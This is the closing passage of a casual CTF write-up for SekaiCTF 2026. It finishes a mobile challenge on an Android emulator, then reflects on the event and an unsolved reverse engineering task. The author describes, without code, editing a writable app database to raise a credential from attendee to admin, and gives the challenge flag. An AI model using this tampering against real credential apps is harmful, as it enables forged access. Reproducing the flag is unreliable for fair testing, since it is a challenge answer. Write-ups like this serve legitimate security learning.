6. Launched Sekai ID of Miku once to generate the keystone keypair and wake up the database
    ![](Pasted%20image%2020260705064126.png)
   
7. Checked **Credential Details** button
    
   ![](Pasted%20image%2020260705064938.png) ![](Pasted%20image%2020260705065016.png)
   
   **Presentation History** & **Settings**
   
   ![248](Pasted%20image%2020260705065112.png)![](Pasted%20image%2020260705065233.png)
   
8. After that, I stopped it with
   
```bash
adb -s 127.0.0.1:5555 shell am force-stop com.sekai.id
```
   To update the database.

8. Entered shell of `emu64x`, and listed out all possible databases inside 
   ![](Pasted%20image%2020260705070242.png)

 9. Immediately went to `sekai-wallet.db` coz it has rw permissions. 
    ![](Pasted%20image%2020260705070422.png)
From here, I tried checking out whats in .tables first, then saw credentials. I elevated the current crendentials from attendee to admin.

10. We are now admin :D 
    
![](Pasted%20image%2020260705070826.png)

10. Ran
     
![](Pasted%20image%2020260705071237.png)

We get an Access Terminal, I immediately pressed Verify Crendential. Then we get a Credential Request page with admin access >:D

![](Pasted%20image%2020260705071403.png)![](Pasted%20image%2020260705071428.png)

12. After pressing Approve & Present...
     
![](Pasted%20image%2020260705071611.png) ![](Pasted%20image%2020260705071640.png)

>> 🏳️ Flag Found: SEKAI{welcome-to-the-conference!}

## Final Thoughts

![](leaderboard-2026-07-04(1).png)

**926 Teams from all over the edges of the world participated in SekaiCTF 2026.**

It was quite surprising for me to see a Project Sekai themed CTF for the first time, coming from someone who adores Miku. I was definitely hooked by looking at their previous CTFs throughout 2022 until now, and even one of their [Rev Challenge about PJSK's Gacha System](https://enscribe.dev/blog/azusawas-gacha-world#post-title). 

The UI and the beauty of their [infrastructure](https://blog.es3n1n.eu/posts/sekaictf-2026-infra-writeup/) is truly a work of art. It's so much cleaner, unique, and addicting than any other CTF's that i've joined. It suits the PJSK theme so much, I love it. Planning on using this if I ever host a CTF event on my own.

I'm really happy whenever there's Miku inside the questions, not to mention the Game categories, where they even included Minecraft as part of their CTF Challenges. 

Come to think of it, the Easy questions were already quite hard to me, compared to local CTF's ive joined in my area... The skill gap is crazy... I do wanna smoke on what these ppl are smokin' *(preferably, i smoke [Pocky](https://www.google.com/search?client=firefox-b-d&channel=entpr&q=pocky) bcuz i dont smoke :3)*

![https://youtu.be/Uk5yWk_BlzU?si=NwGAMCun99qQqh8f&t=10](Pasted%20image%2020260711221739.png)

I was super stuck on solving [mikuprotect](https://ctf.sekai.team/challenges?challenge=rev_mikuprotect), a reverse engineering challenge, where I had 0 knowledge about it. Tried to fuck around and find out, after hours, I came with nothing lol. I did asked in the [#reverse](https://discord.com/channels/1004529434092654663/1513905198785888417/1521065095071793175)  channel of SekaiCTF's Discord Server if there's any writeup for it, surprisingly... The challenge author replied! OwO

![](Pasted%20image%2020260709192146.png)
*~me asking for writeup, seems dat 5 people also wanted to know too!*

![](Pasted%20image%2020260709192249.png)
*~omg no way of the author, es3n1n replied o_o*

![](Pasted%20image%2020260709192403.png)
*~i was abit too shy to reply, cuz im a noobie poopie at ts*

I have **alot** to *learn*, and i'm **always** craving for *more*... Even his reply alone motivates me to *git gud*.

Also found a [new banger of a music to listen with](https://soundcloud.com/syuenn/vol2_ch4), thanks to [es3n1n](https://es3n1n.eu/)!

Unfortunately I was not able to participate at my fullest as it was quite a busy weekend for me, 
but overall, I had alot of fun solving these questions nonetheless!

*There is a reason why my team is called Hitorinbo Envy btw, you need baller knowledge to understand, with the bio aswell, related to PJSK :>*